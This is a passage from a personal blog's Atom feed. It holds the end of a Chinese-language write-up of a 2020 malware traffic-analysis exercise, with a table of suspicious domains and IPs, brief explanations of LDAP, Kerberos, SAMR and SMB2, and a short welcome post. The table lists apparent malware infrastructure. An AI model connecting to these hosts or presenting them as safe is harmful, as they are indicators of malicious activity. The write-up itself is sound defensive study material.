id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h3><p>后续是否可以通过软件分析？<br><img src="/images/20200821-Malware/image.png"></p><h3 id="可疑地址"><a href="#可疑地址" class="headerlink" title="可疑地址"></a>可疑地址</h3><table><thead><tr><th align="center">HOST</th><th align="center">IP</th></tr></thead><tbody><tr><td align="center">ldrbravo.case</td><td align="center">45.147.231.132</td></tr><tr><td align="center">sieseetera.club</td><td align="center">89.44.9.186</td></tr><tr><td align="center">ciliabba.cyou</td><td align="center">89.44.9.186</td></tr><tr><td align="center">ubbifeder.cyou</td><td align="center">89.44.9.186</td></tr></tbody></table><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p><strong>LDAP协议</strong></p><blockquote><p>LDAP（轻量级目录访问协议，Lightweight Directory Access Protocol）是一种用于在网络上访问和维护目录服务的协议。目录服务是一种存储和组织信息的分层数据库，通常用于存储用户、组织、设备等信息，并提供快速和有效的检索功能。</p></blockquote><p><strong>KRB5</strong></p><blockquote><p>KRB5 是 Kerberos 5 的缩写，是一种用于网络身份验证的协议。Kerberos 是一种计算机网络身份验证协议，旨在提供强大的身份验证机制，确保只有合法用户能够访问网络资源。</p></blockquote><p><strong>SAMR</strong></p><blockquote><p>SAMR（Security Accounts Manager Remote Protocol）是一种用于远程管理 Windows 操作系统用户和组的协议。它允许远程客户端应用程序通过网络与 Windows 系统上的安全账户管理器（SAM）进行通信，从而实现对用户账户、组账户和域账户等的管理操作。</p></blockquote><p><strong>SMB2</strong></p><blockquote><p>SMB2（Server Message Block version 2）是一种用于在计算机网络上共享文件、打印机、串口及其他资源的协议。它是 SMB（Server Message Block）协议的更新版本，旨在提供更快、更安全和更可靠的文件共享服务。</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://traffic.y1ng.org/0x1_23-8-2020/">PIZZA-BENDER - Traffic Analysis Train</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2020-08-21-TRAFFIC-ANALYSIS-EXERCISE-PIZZA-BENDER&quot;&gt;&lt;a href=&quot;#2020-08-21-TRAFFIC-ANALYSIS-EXERCISE-PIZZA-BENDER&quot; class=&quot;headerlink&quot; title=&quot;2020-08-21 - TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER&quot;&gt;&lt;/a&gt;2020-08-21 - TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>Welcome to My Blog</title>
    <link href="https://2in9ya2.github.io/first/"/>
    <id>https://2in9ya2.github.io/first/</id>
    <published>2024-04-09T16:00:00.000Z</published>
    <updated>2025-08-13T05:11:30.617Z</updated>
    
    <content type="html"><![CDATA[<div style="text-align: justify;">Welcome to my first blog! I'm thrilled to embark on this journey where I'll be sharing my study experiences, code snippets, and insights into life. It's my pleasure to meet you all! Stay tuned as I continuously improve and enhance the functionality of this blog. <br>As a beginner, if you have any questions or suggestions, please contacting me at any time via <a href="https://twitter.com/JazzNnYs">twitter</a>. I will do my best to provide support.</div>]]></content>
    
    
      
      
    <summary type="html">&lt;div style=&quot;text-align: justify;&quot;&gt;
Welcome to my first blog! I&#39;m thrilled to embark on this journey where I&#39;ll be sharing my study experienc</summary>
      
    
    
    
    <category term="explanation" scheme="https://2in9ya2.github.io/categories/explanation/"/>
    
    
  </entry>
  
</feed>
